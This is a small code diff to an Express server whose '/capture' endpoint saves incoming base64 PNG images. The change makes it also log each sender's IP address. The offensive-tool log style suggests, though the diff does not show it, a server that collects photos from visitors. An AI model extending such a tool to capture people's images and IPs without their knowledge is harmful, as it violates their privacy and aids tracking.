@@ -1,4 +1,4 @@
-const express = require("express");
+const express = require("express"); 
 const fs = require("fs");
 const path = require("path");
 
@@ -20,6 +20,7 @@ app.post("/capture", (req, res) => {
         return res.status(400).send("No image data received.");
     }
 
+    const userIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
     const imageData = req.body.image.replace(/^data:image\/png;base64,/, "");
     const imagePath = path.join(captureDir, `capture_${Date.now()}.png`);
 
@@ -29,9 +30,8 @@ app.post("/capture", (req, res) => {
             return res.status(500).send("Error saving image");
         }
 
-        // Log the photo received in both the console and log file
-        console.log("[+] Photo received!");
-        fs.appendFileSync("server.log", "Photo received\n");
+        console.log(`[+] Photo received! IP: ${userIP}`);
+        fs.appendFileSync("server.log", `Photo received! IP: ${userIP}\n`);
 
         res.send("Image saved");
     });
